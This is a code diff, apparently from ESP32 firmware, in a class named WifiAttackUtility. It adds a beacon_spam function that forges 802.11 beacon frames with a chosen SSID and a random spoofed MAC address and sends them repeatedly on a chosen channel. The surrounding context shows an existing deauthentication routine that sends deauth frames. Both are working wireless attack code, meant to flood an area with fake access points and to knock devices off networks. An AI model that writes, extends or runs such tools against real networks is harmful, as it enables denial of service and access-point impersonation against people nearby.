@@ -59,3 +59,42 @@ esp_err_t WifiAttackUtility::deauthenticate(const MacAddr ap, const MacAddr bssi
   deauth_frame[0] = 0xa0;
   return send_packet(deauth_frame, sizeof(deauth_frame));
 }
+
+esp_err_t WifiAttackUtility::beacon_spam(const std::string& ssid, const uint8_t channel)
+{
+  esp_err_t res = change_channel(channel);
+  if(res != ESP_OK) return res;
+
+  uint8_t tmpSSID[32] = {
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+  };
+
+  for (size_t i = 0; i < ssid.length() && i < 32; i++) {
+    tmpSSID[i] = ssid[i];
+  }
+
+  // set MAC address
+  uint8_t macAddr[6] = {};
+  for (int i = 0; i < 6; i++) {
+    macAddr[i] = random(0, 256);
+  }
+
+  memcpy(&beaconPacket[38], tmpSSID, 32);
+
+  // write MAC address into beacon frame
+  memcpy(&beaconPacket[10], macAddr, 6);
+  memcpy(&beaconPacket[16], macAddr, 6);
+
+  // set channel for beacon frame
+  beaconPacket[82] = channel;
+  beaconPacket[34] = 0x31; // wpa
+  for (int k = 0; k < 3; k++) {
+    send_packet(beaconPacket, sizeof(beaconPacket));
+    vTaskDelay(1 / portTICK_RATE_MS);
+  }
+
+  return ESP_OK;
+}
